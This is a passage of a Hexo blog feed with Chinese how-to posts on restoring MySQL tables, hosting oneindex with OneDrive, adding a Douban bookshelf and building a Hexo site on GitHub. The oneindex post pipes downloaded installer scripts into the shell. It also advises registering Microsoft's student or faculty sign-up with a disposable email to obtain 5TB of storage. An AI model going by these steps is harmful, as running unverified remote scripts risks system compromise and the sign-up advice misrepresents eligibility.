data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814182207.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814182239.png" class="lozad"></p><p>将<em>.frm，</em>.MYD和*.MYI的文件都复制到刚刚创建的数据库文件夹中</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814182249.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814182408.png" class="lozad"></p><p>再次回到小海豚中刷新数据库，发现表已经出现了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814182443.png" class="lozad"></p><p>然后，然后就能看到数据库。哇卡卡。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190814182458.png" class="lozad"></p><h1 id="0x02-踩坑说明"><a href="#0x02-踩坑说明" class="headerlink" title="0x02 踩坑说明"></a>0x02 踩坑说明</h1><p> 我自己在虚拟机中单独安装了mysql5.5的数据库，然后使用小海豚进行连接，但是发现，创建数据库的时候，在mysql的数据库安装文件夹的data中没有出现最新创建的数据库文件夹，。。。。郁闷，为啥每次这些坑都会被我碰到。。。，</p><p>解决方法：我想起来PHPstudy中集成了mysql，于是，我直接卸载了mysql，直接安装了PHPstudy，然后成功还原了数据库。</p><hr>]]></content>
      
      
      <categories>
          
          <category> 数据库 </category>
          
          <category> mysql </category>
          
      </categories>
      
      
        <tags>
            
            <tag> mysql </tag>
            
            <tag> 数据库 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>onedrive+oneindex打造属于自己的个人网盘</title>
      <link href="/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/"/>
      <url>/2019/08/09/onedrive-oneindex%E6%89%93%E9%80%A0%E5%B1%9E%E4%BA%8E%E8%87%AA%E5%B7%B1%E7%9A%84%E4%B8%AA%E4%BA%BA%E7%BD%91%E7%9B%98/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​    前几天在别人的博客中看到有自己搭建的个人专属网盘，看起来还不错的样子，然后了解到是用<code>onedrive+oneindex</code>来实现的，所以自己也通过在网上学习一些相关的文章，并且搭建成功了，所以在这里分享一下搭建的流程，一来是给自己的总结，二来是分享给需要的朋友。</p><a id="more"></a><h1 id="0x01-环境准备"><a href="#0x01-环境准备" class="headerlink" title="0x01 环境准备"></a>0x01 环境准备</h1><blockquote><p>环境需求：</p><p>1.vps一个</p><p>2.宝塔面板环境，Nginx，PHP需要5.6以上版本</p><p>3.onedrive 5T空间</p><p>4.oneindex</p><p>5.域名一个</p></blockquote><h2 id="1-1-vps购买"><a href="#1-1-vps购买" class="headerlink" title="1.1 vps购买"></a>1.1 vps购买</h2><p>访问<a href="https://virmach.com/" target="_blank" rel="noopener">vps购买地址</a>选择经济实惠的Linux VPS</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812094415.png" class="lozad"></p><p>然后拉到最底下，选择kvm的vps，当然选择openVZ的也可以。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812000710.png" class="lozad"></p><p>选择第一个2.5刀的</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812095701.png" class="lozad"></p><p>选择操作系统和带宽</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812095822.png" class="lozad"></p><p>选择vps的位置，然后加入购物车</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812095912.png" class="lozad"></p><p>结账</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812095953.png" class="lozad"></p><p>填写相关信息，然后选择支付宝付款</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812100027.png" class="lozad"></p><h2 id="1-2-宝塔面板的安装"><a href="#1-2-宝塔面板的安装" class="headerlink" title="1.2 宝塔面板的安装"></a>1.2 宝塔面板的安装</h2><p><strong>entos</strong>安装命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">yum install      -y wget &amp;&amp; wget -O install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; sh install.sh</span><br></pre></td></tr></table></figure><p><strong>Ubuntu/Deepin</strong> 安装命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; sudo bash      install.sh</span><br></pre></td></tr></table></figure><p><strong>Debian</strong>安装命令：</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O install.sh http://download.bt.cn/install/install-ubuntu_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><p><strong>Fedora</strong>安装命令:</p><figure class="highlight bash"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">wget -O  install.sh http://download.bt.cn/install/install_6.0.sh &amp;&amp; bash install.sh</span><br></pre></td></tr></table></figure><h2 id="1-3-Nginx和PHP的安装"><a href="#1-3-Nginx和PHP的安装" class="headerlink" title="1.3 Nginx和PHP的安装"></a>1.3 Nginx和PHP的安装</h2><p>​    安装完宝塔面板后，在浏览器中输入<code>vpsip:8888</code>进入宝塔面板，登陆的账号密码在成功安装宝塔后会有提示，根据提示输入登陆就好了，一般情况下第一次登陆宝塔会提示让你安装<code>LNMP</code>环境或者<code>LAMP</code>环境，我们选择安装<code>Nginx+PHP5.6</code>就好了，<code>mysql</code>和<code>phpmyadmin</code>不需要安装</p><p>安装的进度如下，耐心等待安装完成即可。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812000917.png" class="lozad"></p><h1 id="0x02-注册365邮箱"><a href="#0x02-注册365邮箱" class="headerlink" title="0x02 注册365邮箱"></a>0x02 注册365邮箱</h1><p>​        临时邮箱网址：<a href="https://t.odmail.cn/" target="_blank" rel="noopener">https://t.odmail.cn/</a> </p><p>复制网页中的邮箱然后选择 <a href="https://signup.microsoft.com/signup?sku=student" target="_blank" rel="noopener"><strong>学生版</strong></a> or <a href="https://signup.microsoft.com/signup?sku=faculty" target="_blank" rel="noopener"><strong>教师版</strong></a> 在注册,记住，页面不要关闭，待会需要接收验证码</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812001044.png" class="lozad"></p><p>输入刚刚的邮箱</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812002410.png" class="lozad"></p><p>返回刚刚临时邮箱的页面，接收到验证码了</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812002444.png" class="lozad"></p><p>输入验证码</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812002515.png" class="lozad"></p><p>输入相关信息完成注册</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812002515.png" class="lozad"></p><p>需要用手机号验证一下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812002550.png" class="lozad"></p><p>注册完成</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812002609.png" class="lozad"></p><h1 id="0x03-安装oneindex"><a href="#0x03-安装oneindex" class="headerlink" title="0x03 安装oneindex"></a>0x03 安装oneindex</h1><h2 id="3-1-注册域名"><a href="#3-1-注册域名" class="headerlink" title="3.1 注册域名"></a>3.1 注册域名</h2><p><a href="https://wanwang.aliyun.com/?spm=5176.12825654.eofdhaal5.69.3dbd2c4aV1flhF" target="_blank" rel="noopener">域名注册地址</a>直接购买，不懂的，出门右拐百度</p><h2 id="3-2-设置域名解析"><a href="#3-2-设置域名解析" class="headerlink" title="3.2 设置域名解析"></a>3.2 设置域名解析</h2><p>在域名管理中设置域名解析</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812105215.png" class="lozad"></p><p>A记录指向是自己的vps ip地址pan是域名的二级域名，也就是pan.xxx.com</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812105318.png" class="lozad"></p><h2 id="3-3-安装oneindex"><a href="#3-3-安装oneindex" class="headerlink" title="3.3 安装oneindex"></a>3.3 安装oneindex</h2><p>注册好了onedrive以后，我们现在有5T的空间了，具体有没有5T，会在后面上传的部分介绍如何查看</p><p>首先需要下载oneindex的源码，GitHub下载地址：<a href="https://github.com/donwa/oneindex.git" target="_blank" rel="noopener">onindex</a></p><p>然后登陆宝塔面板，配置一下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812103644.png" class="lozad"></p><p>填写自己注册的域名</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812103725.png" class="lozad"></p><p>点击进入网站目录</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812103811.png" class="lozad"></p><p>然后刚刚下载的oneindex源码上传上去，也可以使用远程下载直接远程下载oneindex的源码，如果是自己上传的，需要解压缩一下，解压完以后如下图：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812003319.png" class="lozad"></p><p>然后访问自己的域名直接安装，必须全部都是√才行，如果3,4的权限不够需要在宝塔面板中赋予该文件夹可读可写的权限</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812003403.png" class="lozad"></p><p>都是√的可以跳过不看这个</p><p>重新回到宝塔面板给需要赋予权限的两个文件夹赋权</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812105648.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812105826.png" class="lozad"></p><p>再次刷新，OK，都是√了，</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190806084911.gif" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812003517.png" class="lozad"></p><h1 id="0x04-oneindex的基本设置"><a href="#0x04-oneindex的基本设置" class="headerlink" title="0x04 oneindex的基本设置"></a>0x04 oneindex的基本设置</h1><p>输入<code>域名/?/admin</code>进入oneindex后台管理系统，初始密码是oneindex</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812121805.png" class="lozad"></p><p>修改网盘的名称</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812110510.png" class="lozad"></p><p>在宝塔中设置定时刷新缓存计划</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812110822.png" class="lozad"></p><p>在宝塔面板中添加计划任务</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812110735.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812003537.png" class="lozad"></p><h1 id="0x05-文件上传"><a href="#0x05-文件上传" class="headerlink" title="0x05 文件上传"></a>0x05 文件上传</h1><p>​    为了方便我们上传文件到网盘中，我们需要用到RaiDrive将网盘映射到本地计算机中，当做本地磁盘来使用，具体操作如下：<br>RaiDrive下载:<a href="https://www.raidrive.com/" target="_blank" rel="noopener">官网地址</a>,<a href="http://t.cn/EZKRDHl" target="_blank" rel="noopener">蓝奏云盘</a></p><p>下载完以后就是一步步安装了，傻瓜式操作，下面主要讲一下安装完以后如何将网盘映射到本地</p><p>首先，安装好的RAIDrive是英文的，不习惯得话可以设置成中文，如图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812085628.png" class="lozad"></p><p>然后将网盘映射到本地，操作如下</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812004552.png" class="lozad"></p><p>点击接受</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812004605.png" class="lozad"></p><p>耐心等待一会以后</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812004624.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812004637.png" class="lozad"></p><h1 id="0x06-碰到的问题"><a href="#0x06-碰到的问题" class="headerlink" title="0x06 碰到的问题"></a>0x06 碰到的问题</h1><h2 id="3-4-授权5T空间的时候碰到错误"><a href="#3-4-授权5T空间的时候碰到错误" class="headerlink" title="3.4 授权5T空间的时候碰到错误"></a>3.4 授权5T空间的时候碰到错误</h2><p><strong>问题描述：</strong></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812003656.png" class="lozad"></p><p><strong>问题原因：</strong></p><p>没有使用开通5T onedrive空间的账号登陆</p><p><strong>解决方法：</strong></p><p>如果有5T 的onedrive空间的账号，直接使用该账号登陆即可，如果没有的话，需要自己重新注册一个即可。</p><h2 id="3-5-网盘文章打开404"><a href="#3-5-网盘文章打开404" class="headerlink" title="3.5 网盘文章打开404"></a>3.5 网盘文章打开404</h2><p><strong>问题描述：</strong></p><p>上传到网盘的文件，点击打开以后显示404</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812003902.png" class="lozad"></p><p>问题原因：</p><p>没有设置伪静态，导致访问文件时找不到资源文件。</p><p>解决方法：</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812004008.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812004032.png" class="lozad"></p><p>设置好以后再次访问域名，发现里面的文件夹和文件都可以直接点击查看</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812004050.png" class="lozad"></p><h2 id="3-6-解决图片打开是404问题"><a href="#3-6-解决图片打开是404问题" class="headerlink" title="3.6 解决图片打开是404问题"></a>3.6 解决图片打开是404问题</h2><p>将伪静态替换成下面</p> <figure class="highlight nginx"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br></pre></td><td class="code"><pre><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^./files/(.)</span> /wp-includes/ms-files.php?file=<span class="number">1</span> <span class="literal">last</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">if</span> (!-e <span class="variable">$request_filename</span>)&#123;</span><br><span class="line"></span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^.+?(/wp-.*)</span> <span class="variable">$1</span> <span class="literal">last</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^.+?(/.*.php)$</span> <span class="variable">$1</span> <span class="literal">last</span>;</span><br><span class="line"></span><br><span class="line"><span class="attribute">rewrite</span><span class="regexp"> ^</span> /index.php <span class="literal">last</span>;</span><br><span class="line"></span><br><span class="line">&#125;</span><br></pre></td></tr></table></figure><p>成功访问</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190812111011.png" class="lozad"></p><p><strong>参考链接：</strong></p><p><a href="https://www.52pojie.cn/thread-847650-1-1.html" target="_blank" rel="noopener">https://www.52pojie.cn/thread-847650-1-1.html</a></p><p> <a href="https://github.com/donwa/oneindex" target="_blank" rel="noopener">https://github.com/donwa/oneindex</a></p><p> <a href="https://blog.csdn.net/github_39533414/article/details/83687260" target="_blank" rel="noopener">https://blog.csdn.net/github_39533414/article/details/83687260</a></p><p> <a href="https://www.moerats.com/archives/592/" target="_blank" rel="noopener">https://www.moerats.com/archives/592/</a></p><p> <a href="http://www.sumbk.com/339.html" target="_blank" rel="noopener">http://www.sumbk.com/339.html</a></p><p> <a href="http://blog.jialezi.net/?post=120" target="_blank" rel="noopener">http://blog.jialezi.net/?post=120</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> 教程 </category>
          
          <category> 好玩 </category>
          
      </categories>
      
      
        <tags>
            
            <tag> oneindex </tag>
            
            <tag> onedrive </tag>
            
            <tag> 个人网盘 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>给博客添加豆瓣书架功能</title>
      <link href="/2019/08/09/%E7%BB%99%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E8%B1%86%E7%93%A3%E4%B9%A6%E6%9E%B6%E5%8A%9F%E8%83%BD/"/>
      <url>/2019/08/09/%E7%BB%99%E5%8D%9A%E5%AE%A2%E6%B7%BB%E5%8A%A0%E8%B1%86%E7%93%A3%E4%B9%A6%E6%9E%B6%E5%8A%9F%E8%83%BD/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>在一次浏览个人博客网站的过程中，返现有个网站有豆瓣读书的功能，可以在页面展示自己读了哪些书，想看哪些书等，我觉得这个功能特别的好，可以记录自己的读书，还可以在读完以后写上自己的书评。下面来给大家讲讲怎么在自己的博客中实现这个功能。</p><a id="more"></a><p>#0x01 成品展示</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190809230631.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190809230647.png" class="lozad"></p><p>#0x02 需求配置</p><p>##2.1 安装插件</p><p>在博客的根目录下输入命令安装</p><p><code>npm install hexo-douban --save</code></p><p>##2.2 站点配置文件中添加配置</p><p>在<code>Hexo</code>站点根目录配置文件<code>_config.xml</code>中的末尾添加如下配置：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br><span class="line">8</span><br><span class="line">9</span><br><span class="line">10</span><br><span class="line">11</span><br><span class="line">12</span><br><span class="line">13</span><br></pre></td><td class="code"><pre><span class="line">douban:</span><br><span class="line">   user: mythsman</span><br><span class="line">   builtin: false</span><br><span class="line">   book:</span><br><span class="line">     title: <span class="string">'This is my book title'</span></span><br><span class="line">     quote: <span class="string">'This is my book quote'</span></span><br><span class="line">   movie:</span><br><span class="line">     title: <span class="string">'This is my movie title'</span></span><br><span class="line">     quote: <span class="string">'This is my movie quote'</span></span><br><span class="line">   game:</span><br><span class="line">     title: <span class="string">'This is my game title'</span></span><br><span class="line">     quote: <span class="string">'This is my game quote'</span></span><br><span class="line">   timeout: <span class="number">10000</span></span><br></pre></td></tr></table></figure><blockquote><p>上面参数说明：</p><ul><li><strong>user</strong>: 你的豆瓣ID.打开豆瓣，登入账户，然后在右上角点击      “个人主页” ，这时候地址栏的URL大概是这样：”<a href="https://links.jianshu.com/go?to=https%3A%2F%2Fwww.douban.com%2Fpeople%2Fxxxxxx%2F" target="_blank" rel="noopener">https://www.douban.com/people/xxxxxx/</a>“      ，其中的”xxxxxx”就是你的个人ID了。</li><li><strong>builtin</strong>: 是否将生成页面的功能嵌入hexo s和hexo      g中，默认是false,另一可选项为true(1.x.x版本新增配置项)。</li><li><strong>title</strong>: 该页面的标题.</li><li><strong>quote</strong>: 写在页面开头的一段话,支持html语法.</li><li><strong>timeout</strong>: 爬取数据的超时时间，默认是 10000ms      ,如果在使用时发现报了超时的错(ETIMEOUT)可以把这个数据设置的大一点。</li></ul></blockquote><p>由于<code>hexo-douban</code>是默认抓取豆瓣读书、豆瓣电影以及豆瓣游戏的，如果只想要其中一部分，可以把其它部分在上述配置文件中去掉即可。</p><h1 id="0x03-启用使用"><a href="#0x03-启用使用" class="headerlink" title="0x03 启用使用"></a>0x03 启用使用</h1><p>插件安装好了，需要配置的也配置好了，下面就需要生成我们的豆瓣书架、电影页面了。</p><p>##3.1 生成页面</p><p>在GitBash下输入命令：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br><span class="line">7</span><br></pre></td><td class="code"><pre><span class="line">hexo clean  <span class="comment">#清除之前生成的文件</span></span><br><span class="line">hexo douban -bmg   <span class="comment">#生成豆瓣书籍、电影、游戏页面</span></span><br><span class="line">hexo g             <span class="comment">#生成文章</span></span><br><span class="line">hexo s           <span class="comment">#启动本地服务器</span></span><br><span class="line">hexo deploy        <span class="comment">#上传部署</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#-bgm代表的是book、game、movie三个参数，如果只需要其中的一部分就只带你想要的那些参数。</span></span><br></pre></td></tr></table></figure><blockquote><p>注：由于<code>hexo douban</code>的简写也是hexo d，与hexo deploy的简写指令hexo d冲突，因此在进行二者部署的时候，只能都打全名而不能打简写形式</p></blockquote><p>##3.2 测试</p><p>如果在<code>hexo douban -bmg</code>这步没有问题的话，会出现如下信息</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190809233452.png" class="lozad"></p><p>然后我们只需要在站点目录下测试<a href="http://localhost:4000/books" target="_blank" rel="noopener">http://localhost:4000/books</a> 或者 <a href="http://localhost:4000/movies等，如果看到页面了就说明成功了。" target="_blank" rel="noopener">http://localhost:4000/movies等，如果看到页面了就说明成功了。</a></p><p>##3.3 配置</p><p>如果上述都没有问题，我们就可以在菜单栏中添加按钮了，打开主题配置文件<code>_config.xml</code>，找到菜单按钮，可以选择性的添加下面内容：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  home: /</span><br><span class="line">  archives: /archives</span><br><span class="line">  books: /books     <span class="comment"># 这是链接到books页面</span></span><br><span class="line">  movies: /movies   <span class="comment">#  这是链接到movies页面</span></span><br><span class="line">  games: /games   <span class="comment"># 这是链接到games页面</span></span><br></pre></td></tr></table></figure><p>注意添加完成之后按钮并不是中文的，这是由于在languages文件夹下面的<code>zh-CN</code>（中文语言配置文件）没有添加上述对应的中文参数信息，所以我们需要主动添加,语言文件夹在你的主题配置文件夹下面，如下图</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190809235531.png" class="lozad"></p><p>在<code>menu</code>菜单下添加：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br></pre></td><td class="code"><pre><span class="line">menu:</span><br><span class="line">  books: 阅读</span><br><span class="line">  movies: 电影</span><br><span class="line">  games: 游戏</span><br></pre></td></tr></table></figure><p>#0x04 碰到的问题</p><p>输入<code>hexo douban -bg</code>以后，发现没有按照教程一样产生相关的页面</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190809234000.png" class="lozad"></p><p>在网上百度，<code>Google</code>了好久都没有相关的问题，只有相关的教程，也重装了无数次，还是不成功，但是这个插件明明是支持next主题的，所以我就在虚拟机里面重新搭建了一个干干净净的博客，然后安装上这个插件后，发现可以正常产生页面的。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190809234028.png" class="lozad"></p><p>所以断定，肯定是我的博客配置出现了问题而不是插件的问题了，在精确定位一下问题：要么是主题的配置的问题，要么的<code>hexo</code>的配置问题，要么是可能去之前安装的功能插件冲突。</p><p>通过将原始的配置复制到我的博客中，发现产生，同构将我博客中的配置文件复制到原始的配置中，发现不能产生，从而断定了问题是出在<code>hexo</code>的站点配置文件中，因为我直接将新的站点配置文件复制进去是可以正常产生页面的。所以在进一步排查到底是站点配置文件中的什么配置出了问题。</p><p>最后查出，原来是<code>douban:</code>前面多了空格，必须要顶格才行。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190809234203.png" class="lozad"></p><p>再次运行<code>hexo douban -bmg</code>成功生成<code>books</code>和<code>games</code>页面。</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190809234225.png" class="lozad"></p><p>#0x05 参考链接</p><p><a href="https://github.com/mythsman/hexo-douban" target="_blank" rel="noopener">https://github.com/mythsman/hexo-douban</a></p><hr>]]></content>
      
      
      <categories>
          
          <category> hexo </category>
          
      </categories>
      
      
        <tags>
            
            <tag> hexo </tag>
            
            <tag> 豆瓣书架 </tag>
            
        </tags>
      
    </entry>
    
    
    
    <entry>
      <title>github+hexo+域名搭建一个自己的网站</title>
      <link href="/2019/08/09/github-hexo-%E5%9F%9F%E5%90%8D%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99/"/>
      <url>/2019/08/09/github-hexo-%E5%9F%9F%E5%90%8D%E6%90%AD%E5%BB%BA%E4%B8%80%E4%B8%AA%E8%87%AA%E5%B7%B1%E7%9A%84%E7%BD%91%E7%AB%99/</url>
      
        <content type="html"><![CDATA[<h1 id="0x00-前言"><a href="#0x00-前言" class="headerlink" title="0x00 前言"></a>0x00 前言</h1><p>​        在一次无意的搜索文章中，看到了一个特别好的网站，不管是前端还是网站的内容都做的非常吸引人。我一开始以为是WordPress搭建的个人博客，后台得知使用hexo+GitHub来搭建的，顿时心中的博客火又燃了起来。<code>$_$</code>因为我之前也用WordPress搭建过自己的博客，但是由于需要购买阿里云的服务器，这对于我这个穷人来说是一笔开销，所以在服务器到期以后就没有在续费了，而hexo+GitHub搭建的是完全免费的，利用的是GitHub page，然后hexo将我们写的博客渲染成静态页面在部署到GitHub中去，最后在前端展现出来。下面就给大家介绍一个搭建的过程。</p><a id="more"></a><p>#0x01 环境准备</p><blockquote><p>需要的东西：</p><ol><li>node.js</li><li>git</li><li>hexo</li><li>GitHub账号</li><li>域名</li></ol></blockquote><p>##1.1 node和git的安装</p><p>Node.js下载](<a href="http://nodejs.org/" target="_blank" rel="noopener">http://nodejs.org/</a>) ，<a href="http://git-scm.com/" target="_blank" rel="noopener">Git下载</a> ，下载完成以后，直接傻瓜式下一步安装即可。</p><p>按win+R 输入<code>cmd</code>命令来检查是否安装成功</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br></pre></td><td class="code"><pre><span class="line">node -v <span class="comment">#查看node版本</span></span><br><span class="line">git -v <span class="comment">#查看git版本</span></span><br></pre></td></tr></table></figure><p>出现下图说明安装成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816134834.png" class="lozad"></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816134852.png" class="lozad"></p><p>##1.2 hexo的安装</p><p>首先需要新建一个空的Blog文件夹，可以在任意盘符右击新建个文件夹，也可以通过cmd命令来完成</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816135215.png" class="lozad"></p><p>输入Blog文件夹下输入<code>npm install hexo -g</code>安装<code>hexo</code>（速度根据你的实时网速）</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816135313.png" class="lozad"></p><p>输入<code>hexo -v</code>，检查<code>hexo</code>是否安装成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816135359.png" class="lozad"></p><p>输入<code>hexo init</code>，初始化该文件夹（需要等待一会）</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816135420.png" class="lozad"></p><p>输入<code>npm install</code>，安装所需要的组件</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816135440.png" class="lozad"></p><p>输入<code>hexo g</code>（=hexo generate），生成静态页面</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816135513.png" class="lozad"></p><p>输入<code>hexo s</code>（=hexo server），开启服务器，访问该网址，正式体验<code>Hexo</code></p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816135538.png" class="lozad"></p><p>访问<a href="http://localhost:4000" target="_blank" rel="noopener">http://localhost:4000</a> 出现下图，说明本地搭建成功</p><p><img alt data-src="https://raw.githubusercontent.com/mad-coding/PictureBed/master/img/20190816135627.png" class="lozad"></p><p>命令总结：</p><figure class="highlight python"><table><tr><td class="gutter"><pre><span class="line">1</span><br><span class="line">2</span><br><span class="line">3</span><br><span class="line">4</span><br><span class="line">5</span><br><span class="line">6</span><br></pre></td><td class="code"><pre><span class="line">hexo -v <span class="comment">#查看hexo版本</span></span><br><span class="line">hexo init<span class="comment">#初始化hexo</span></span><br><span class="line">hexo install <span class="comment">#安装hexo</span></span><br><span class="line">hexo g<span class="comment">#将文章渲染成静态页面</span></span><br><span class="line">hexo s<span class="comment">#启动本地hexo服务器</span></span><br><span class="line">hexo d  <span class="comment">#部署到GitHub（后面介绍）</span></span><br></pre></td></tr></table></figure><h2 id="1-3-注册GitHub账号"><a href="#1-3-注册GitHub账号" class="headerlink" title="1.3 注册GitHub账号"></a>1.3 注册GitHub账号</h2><p>注册地址：<a href="https://github.com/" target="_blank" rel="noopener">github</a></p><p><img alt 